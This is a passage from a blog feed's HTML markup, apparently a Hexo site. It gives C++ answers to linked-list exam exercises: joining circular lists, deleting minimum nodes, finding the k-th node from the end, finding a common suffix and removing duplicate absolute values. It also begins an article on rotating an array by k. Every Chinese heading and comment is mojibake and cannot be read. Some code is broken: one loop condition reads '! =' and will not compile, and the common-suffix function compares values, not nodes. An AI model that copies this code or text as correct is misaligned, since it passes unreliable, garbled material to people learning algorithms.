keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="24-æœ‰ä¸¤ä¸ªå¾ªç¯å•é“¾è¡¨ï¼Œé“¾è¡¨å¤´æŒ‡é’ˆåˆ†åˆ«ä¸ºh1å’Œh2ï¼Œç¼–å†™ä¸€ä¸ªå‡½æ•°å°†é“¾è¡¨h2é“¾æ¥åˆ°é“¾è¡¨h1ä¹‹åï¼Œè¦æ±‚é“¾æ¥åçš„é“¾è¡¨ä»ä¿æŒå¾ªç¯é“¾è¡¨å½¢å¼ã€‚">24)  æœ‰ä¸¤ä¸ªå¾ªç¯å•é“¾è¡¨ï¼Œé“¾è¡¨å¤´æŒ‡é’ˆåˆ†åˆ«ä¸ºh1å’Œh2ï¼Œç¼–å†™ä¸€ä¸ªå‡½æ•°å°†é“¾è¡¨h2é“¾æ¥åˆ°é“¾è¡¨h1ä¹‹åï¼Œè¦æ±‚é“¾æ¥åçš„é“¾è¡¨ä»ä¿æŒå¾ªç¯é“¾è¡¨å½¢å¼ã€‚</h2><div class="story post-story"><p><img src="https://img-blog.csdnimg.cn/20200825221922581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,zoom:50%25,color_FFFFFF,t_70#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200825221922581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,zoom:50%25,color_FFFFFF,t_70#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** *  */</span><span class="token keyword">void</span> <span class="token function">fun5</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>h1<span class="token punctuation">,</span>linklist <span class="token operator">&amp;</span>h2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist p<span class="token punctuation">,</span>q<span class="token punctuation">;</span>    p <span class="token operator">=</span> h1<span class="token punctuation">,</span>q <span class="token operator">=</span> h2<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token operator">-></span>next <span class="token operator">!=</span> h1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>q<span class="token operator">-></span>next <span class="token operator">!=</span> h2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        q <span class="token operator">=</span> q<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    p<span class="token operator">-></span>next <span class="token operator">=</span> h2<span class="token punctuation">;</span>    q<span class="token operator">-></span>next <span class="token operator">=</span> h1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="25-è®¾æœ‰ä¸€ä¸ªå¸¦å¤´ç»“ç‚¹çš„å¾ªç¯å•é“¾è¡¨ï¼Œå…¶ç»“ç‚¹å€¼å‡ä¸ºæ­£æ•´æ•°ã€‚è®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œåå¤æ‰¾å‡ºå•é“¾è¡¨ä¸­ç»“ç‚¹å€¼æœ€å°çš„ç»“ç‚¹å¹¶è¾“å‡ºï¼Œç„¶åå°†è¯¥ç»“ç‚¹ä»ä¸­åˆ é™¤ï¼Œç›´åˆ°å•é“¾è¡¨ä¸ºç©ºä½ç½®ï¼Œå†åˆ é™¤è¡¨å¤´ç»“ç‚¹">25)  è®¾æœ‰ä¸€ä¸ªå¸¦å¤´ç»“ç‚¹çš„å¾ªç¯å•é“¾è¡¨ï¼Œå…¶ç»“ç‚¹å€¼å‡ä¸ºæ­£æ•´æ•°ã€‚è®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œåå¤æ‰¾å‡ºå•é“¾è¡¨ä¸­ç»“ç‚¹å€¼æœ€å°çš„ç»“ç‚¹å¹¶è¾“å‡ºï¼Œç„¶åå°†è¯¥ç»“ç‚¹ä»ä¸­åˆ é™¤ï¼Œç›´åˆ°å•é“¾è¡¨ä¸ºç©ºä½ç½®ï¼Œå†åˆ é™¤è¡¨å¤´ç»“ç‚¹</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** *  åŒç¬¬16æ–¹æ³•ä¸€è‡´ï¼Œè¿™é‡Œä¸ºå¾ªç¯ç”µå•é“¾è¡¨ï¼Œåˆ¤ç©ºæ¡ä»¶éœ€æ”¹å˜ */</span><span class="token keyword">void</span> <span class="token function">Del_all</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist p<span class="token punctuation">,</span>pre<span class="token punctuation">,</span>minp<span class="token punctuation">,</span>minpre<span class="token punctuation">;</span>    <span class="token comment">// æ²¡å¾ªç¯ä¸€æ¬¡Lå‡å°‘ä¸€ä¸ªç»“ç‚¹ï¼Œå½“L->nextä¸ºLæ—¶ï¼Œè¯´æ˜å…¨éƒ¨åˆ å®Œ</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>L<span class="token operator">-></span>next<span class="token operator">!</span> <span class="token operator">=</span> L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        p <span class="token operator">=</span> L<span class="token operator">-></span>next<span class="token punctuation">;</span>pre <span class="token operator">=</span> L<span class="token punctuation">;</span>        minp <span class="token operator">=</span> p<span class="token punctuation">,</span> minpre <span class="token operator">=</span> pre<span class="token punctuation">;</span>        <span class="token comment">// æ‰¾åˆ°æœ€å°ç»“ç‚¹</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token operator">-></span>next <span class="token operator">!=</span> L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// å¾ªç¯å•é“¾è¡¨</span>            <span class="token comment">// æ‰¾åˆ°æœ€å°ç»“ç‚¹</span>            <span class="token keyword">if</span><span class="token punctuation">(</span> p<span class="token operator">-></span>data <span class="token operator">&lt;</span> minp<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                minp <span class="token operator">=</span> p<span class="token punctuation">;</span>                minpre <span class="token operator">=</span> pre<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                pre <span class="token operator">=</span> p<span class="token punctuation">;</span>                p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//free minp</span>        cout<span class="token operator">&lt;&lt;</span>minp<span class="token operator">-></span>data<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>        minpre<span class="token operator">-></span>next <span class="token operator">=</span> minp<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">// åˆ é™¤èŠ‚ç‚¹ä¿è¯ä¸æ–­é“¾</span>        <span class="token function">free</span><span class="token punctuation">(</span>minp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">free</span><span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="26-å·²çŸ¥å¸¦å¤´ç»“ç‚¹å•é“¾è¡¨ï¼Œå¤´æŒ‡é’ˆlistï¼Œä¸æ”¹å˜é“¾è¡¨çš„å‰æä¸‹è®¾è®¡é«˜æ•ˆçš„ç®—æ³•ï¼ŒæŸ¥æ‰¾é“¾è¡¨ä¸­å€’æ•°ç¬¬kä¸ªä½ç½®ä¸Šçš„èŠ‚ç‚¹çš„å€¼-408-Y09">26)  å·²çŸ¥å¸¦å¤´ç»“ç‚¹å•é“¾è¡¨ï¼Œå¤´æŒ‡é’ˆlistï¼Œä¸æ”¹å˜é“¾è¡¨çš„å‰æä¸‹è®¾è®¡é«˜æ•ˆçš„ç®—æ³•ï¼ŒæŸ¥æ‰¾é“¾è¡¨ä¸­å€’æ•°ç¬¬kä¸ªä½ç½®ä¸Šçš„èŠ‚ç‚¹çš„å€¼(408.Y09)</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * æŒæ¡æ€æƒ³å¾ˆé‡è¦ï¼ŒO(n)å†…å®ç° * ä¸¤ä¸ªæŒ‡é’ˆp,qï¼Œ på…ˆèµ°kæ­¥ï¼Œç„¶åp,qä¸€èµ·èµ°ï¼Œå½“påˆ°æ—¶ï¼Œqå³ä¸ºå€’æ•°ç¬¬kä¸ªä½ç½® * æœ‰å¯èƒ½ä¼šå‡ºç° k å¤§äºè¡¨é•¿çš„æƒ…å†µ,éœ€è¦åˆ¤æ–­ */</span><span class="token keyword">int</span> <span class="token function">fun6</span><span class="token punctuation">(</span>linklist list<span class="token punctuation">,</span><span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist p<span class="token punctuation">,</span>q<span class="token punctuation">;</span>    p <span class="token operator">=</span> list<span class="token operator">-></span>next<span class="token punctuation">;</span>    q <span class="token operator">=</span> list<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// p èµ°kæ­¥</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            i<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token comment">// p,q åŒæ—¶èµ°</span>            q <span class="token operator">=</span> q<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token comment">// k > n</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout<span class="token operator">&lt;&lt;</span>q<span class="token operator">-></span>data<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token comment">// æ­¤æ—¶q->dataå³ä¸ºå€’æ•°ç¬¬kä¸ªä½ç½®</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="27-å‡å®šé‡‡ç”¨å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ä¿å­˜å•è¯-å½“ä¸¤ä¸ªå•è¯æœ‰ç›¸åŒçš„åç¼€æ—¶-å¯å…±äº«ç›¸åŒçš„åç¼€å­˜å‚¨ç©ºé—´-ä¾‹å¦‚-â€œ-loadingâ€å’Œ-beingâ€çš„å­˜å‚¨æ˜ åƒå¦‚ä¸‹å›¾æ‰€ç¤º-408-Y12">27) å‡å®šé‡‡ç”¨å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ä¿å­˜å•è¯,å½“ä¸¤ä¸ªå•è¯æœ‰ç›¸åŒçš„åç¼€æ—¶,å¯å…±äº«ç›¸åŒçš„åç¼€å­˜å‚¨ç©ºé—´,ä¾‹å¦‚,â€œ loadingâ€å’Œ&quot; beingâ€çš„å­˜å‚¨æ˜ åƒå¦‚ä¸‹å›¾æ‰€ç¤º(408,Y12)</h2><div class="story post-story"><p><img src="https://img-blog.csdnimg.cn/20200825222102312.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200825222102312.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>è®¾str1å’Œstr2åˆ†åˆ«æŒ‡å‘ä¸¤ä¸ªå•è¯æ‰€åœ¨å•é“¾è¡¨çš„å¤´ç»“ç‚¹,é“¾è¡¨ç»“ç‚¹ç»“æ„ä¸º data nextè¯·è®¾è®¡ä¸€ä¸ªæ—¶é—´ä¸Šå°½å¯èƒ½é«˜æ•ˆçš„ç®—æ³•,æ‰¾å‡ºç”±str1å’Œstr2æ‰€æŒ‡å‘ä¸¤ä¸ªé“¾è¡¨å…±åŒåç¼€çš„èµ·å§‹ä½ç½®(å¦‚å›¾ä¸­å­—ç¬¦ä¸»æ‰€åœ¨ç»“ç‚¹çš„ä½ç½®p)ã€‚è¦æ±‚</strong></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/*** æ±‚å…¬å…±åç¼€,  æ±‚strlen(str1),strlen(str2);* æ±‚å·®kï¼Œ å¤§è€…å…ˆèµ°kæ­¥ï¼Œ ç„¶ååŒæ—¶èµ°ï¼Œç¬¬ä¸€ä¸ªç›¸ç­‰çš„å³ä¸ºå…¬å…±åç¼€èµ·ç‚¹*/</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">link</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> data<span class="token punctuation">;</span>    link <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>node<span class="token punctuation">,</span><span class="token operator">*</span>linklist<span class="token punctuation">;</span>linklist <span class="token function">Common2</span><span class="token punctuation">(</span>linklist str1<span class="token punctuation">,</span>linklist str2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>s<span class="token punctuation">,</span>l<span class="token punctuation">;</span>    p <span class="token operator">=</span> str1<span class="token operator">-></span>next<span class="token punctuation">,</span>q <span class="token operator">=</span> str2<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">int</span> len1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>len2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>k<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">,</span>len1<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token comment">// æ±‚str1é•¿åº¦</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> q <span class="token operator">=</span> q<span class="token operator">-></span>next<span class="token punctuation">,</span>len2<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token comment">// æ±‚str2é•¿åº¦</span>    <span class="token comment">// è®© sæŒ‡å‘çŸ­é“¾ ï¼›læŒ‡å‘é•¿é“¾</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len1 <span class="token operator">&lt;</span> len2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        k <span class="token operator">=</span> len2 <span class="token operator">-</span> len1<span class="token punctuation">;</span>        s <span class="token operator">=</span> str1<span class="token operator">-></span>next<span class="token punctuation">;</span>        l <span class="token operator">=</span> str2<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        k <span class="token operator">=</span> len1 <span class="token operator">-</span> len2<span class="token punctuation">;</span>        s <span class="token operator">=</span> str2<span class="token operator">-></span>next<span class="token punctuation">;</span>        l <span class="token operator">=</span> str1<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>k<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// æˆ–è€… for(int i = 0 ;i &lt; k ;i++)</span>        l <span class="token operator">=</span> l<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>s<span class="token operator">&amp;&amp;</span>l<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> s<span class="token operator">-></span>data <span class="token operator">==</span> l<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> s<span class="token punctuation">;</span> <span class="token comment">//  è¿”å›sçš„èµ·å§‹ä½ç½®,æ­¤æ—¶s->dataå³ä¸ºç¬¬ä¸€ä¸ªç›¸åŒå…ƒç´ (ä¸å¸¦å¤´ç»“ç‚¹)</span>           <span class="token comment">/* æ­¤æ—¶è¿”å›çš„æ˜¯å¸¦å¤´ç»“ç‚¹çš„            linklist temp = new node();            temp->next = s;            return temp;            */</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            s <span class="token operator">=</span> s<span class="token operator">-></span>next<span class="token punctuation">;</span>            l <span class="token operator">=</span> l<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> new <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><img src="https://img-blog.csdnimg.cn/20200825222122888.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200825222122888.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200825222140373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200825222140373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></div><h2 id="28-ç”¨å•é“¾è¡¨ä¿å­˜mä¸ªæ•´æ•°-ç»“ç‚¹çš„ç»“æ„ä¸ºdata-link-data-â‰¤n-nä¸ºæ­£æ•´æ•°-ã€‚ç°è¦æ±‚è®¾è®¡ä¸€ä¸ªæ—¶é—´å¤æ‚åº¦å°½å¯èƒ½é«˜æ•ˆçš„ç®—æ³•-å¯¹äºé“¾è¡¨ä¸­dataçš„ç»å¯¹å€¼ç›¸ç­‰çš„ç»“ç‚¹-ä»…ä¿ç•™ç¬¬ä¸€æ¬¡å‡ºç°çš„ç»“ç‚¹è€Œåˆ é™¤å…¶ä½™ç»å¯¹å€¼ç›¸ç­‰çš„ç»“ç‚¹ã€‚ä¾‹å¦‚-è‹¥ç»™å®šçš„å•é“¾è¡¨headå¦‚ä¸‹-408-Y15">28) ç”¨å•é“¾è¡¨ä¿å­˜mä¸ªæ•´æ•°,ç»“ç‚¹çš„ç»“æ„ä¸ºdata,link,|data|â‰¤n(nä¸ºæ­£æ•´æ•°)ã€‚ç°è¦æ±‚è®¾è®¡ä¸€ä¸ªæ—¶é—´å¤æ‚åº¦å°½å¯èƒ½é«˜æ•ˆçš„ç®—æ³•,å¯¹äºé“¾è¡¨ä¸­dataçš„ç»å¯¹å€¼ç›¸ç­‰çš„ç»“ç‚¹,ä»…ä¿ç•™ç¬¬ä¸€æ¬¡å‡ºç°çš„ç»“ç‚¹è€Œåˆ é™¤å…¶ä½™ç»å¯¹å€¼ç›¸ç­‰çš„ç»“ç‚¹ã€‚ä¾‹å¦‚,è‹¥ç»™å®šçš„å•é“¾è¡¨headå¦‚ä¸‹:(408,Y15)</h2><div class="story post-story"><p><img src="https://img-blog.csdnimg.cn/20200825222153477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200825222153477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/*** åˆ é™¤é‡å¤ç»“ç‚¹,æ— åº* å»ºç«‹ä¸€ä¸ªmapç´¢å¼•,å­˜æ”¾data,å¦‚æœä¸å­˜åœ¨åˆ™,é“¾è¡¨è·³è¿‡ï¼Œå¦åˆ™åˆ é™¤è¿™ä¸ªç»“ç‚¹ï¼Œ* è¿™é‡Œæ±‚çš„æ˜¯|data| æ‰€ä»¥ç´¢å¼•ç”¨æ•°ç»„å³å¯* æ—¶é—´O(m),ç©ºé—´O(n)**/</span><span class="token keyword">void</span> <span class="token function">fun6</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>Head<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist p<span class="token punctuation">,</span>pre<span class="token punctuation">;</span>    <span class="token keyword">int</span> vis<span class="token punctuation">[</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// åˆå§‹åŒ–vis æ ‡è®°ä¸º0;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>vis<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>vis<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    p <span class="token operator">=</span> Head<span class="token operator">-></span>next<span class="token punctuation">;</span>pre <span class="token operator">=</span> Head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// ç¬¬ä¸€æ¬¡å­˜åœ¨ï¼Œè·³è¿‡(ä¿ç•™)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>vis<span class="token punctuation">[</span><span class="token function">abs</span><span class="token punctuation">(</span>p<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            vis<span class="token punctuation">[</span><span class="token function">abs</span><span class="token punctuation">(</span>p<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            pre <span class="token operator">=</span> p<span class="token punctuation">;</span>            p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token comment">//é‡å¤</span>            pre<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>            <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//é‡Šæ”¾</span>            p <span class="token operator">=</span> pre<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">// åˆ é™¤på,ä¿è¯ä¸æ–­é“¾</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><img src="https://img-blog.csdnimg.cn/2020082522220442.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2020082522220442.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> ç®—æ³• </category>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¾ªç¯å³ç§»Kä½é—®é¢˜çš„æ€è€ƒï¼Œå‡ ç§æ–¹æ³•çš„è§£å†³</title>
      <link href="/posts/c1919217/"/>
      <url>/posts/c1919217/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><h1>å¾ªç¯å³ç§»Kä½é—®é¢˜</h1><p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p><h2 id="è¯•ç”¨é¡ºåºå­˜å‚¨ç»“æ„è®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œä»…ç”¨ä¸€ä¸ªè¾…åŠ©ç»“ç‚¹ï¼Œå®ç°å°†çº¿æ€§è¡¨ä¸­çš„ç»“ç‚¹å¾ªç¯å³ç§»kä½çš„è¿ç®—ï¼Œå¹¶åˆ†æï¼Œç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ï¼">è¯•ç”¨é¡ºåºå­˜å‚¨ç»“æ„è®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œä»…ç”¨ä¸€ä¸ªè¾…åŠ©ç»“ç‚¹ï¼Œå®ç°å°†çº¿æ€§è¡¨ä¸­çš„ç»“ç‚¹å¾ªç¯å³ç§»kä½çš„è¿ç®—ï¼Œå¹¶åˆ†æï¼Œç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ï¼</h2><div class="story post-story"><h3 id="æ–¹æ³•ä¸€-modç§»ä½æ€æƒ³">æ–¹æ³•ä¸€: modç§»ä½æ€æƒ³</h3><img src="https://gitee.com/sizaif/images/raw/master/img/20201021133306.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20201021133306.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20200921203625271" style="zoom: 33%;" /><pre><code>å›¾ä¸€ï¼š</code></pre><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/** * æ€è·¯:  * è¿ç”¨modçš„æ€æƒ³, å°†nå¤åˆ¶æˆ2nçš„æ•°ç»„ å¦‚å›¾ä¸€æ‰€ç¤º; é‚£ä¹ˆå¾ªç¯æœ‰ç§» é€ƒä¸å‡º2nå†… * å³ç§»åçš„ç»“æœä¸ºï¼š (i+k)   ç¼©åˆ°nå†…çš„è¯ å°±æ˜¯ (i+k)%n * å®é™…ä¸Šåªéœ€è¦ç”¨å¦å¤–ä¸€ä¸ªæ•°ç»„B[] æ¥å­˜å– åŸæ•°ç»„A[] çš„å†…å®¹ å³ B[i] = A[(i+n-k)%n]; * ä½†æ˜¯ è¿™æ ·çš„è¯  ç©ºé—´å¤æ‚åº¦å°±ä¸º O(n), æ—¶é—´å¤æ‚åº¦ä¸º O(n); */</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span> n <span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">[</span> i <span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> n <span class="token operator">-</span> k<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://img-blog.csdnimg.cn/img_convert/d64be21c100fd50a38736322cb6c002c.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/d64be21c100fd50a38736322cb6c002c.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201107120751845"></p><h3 id="æ–¹æ³•ä¸€plusï¼š">æ–¹æ³•ä¸€plusï¼š</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/e80ebb7f29f60cf5a4459eecd01af216.png" class="lazyload" 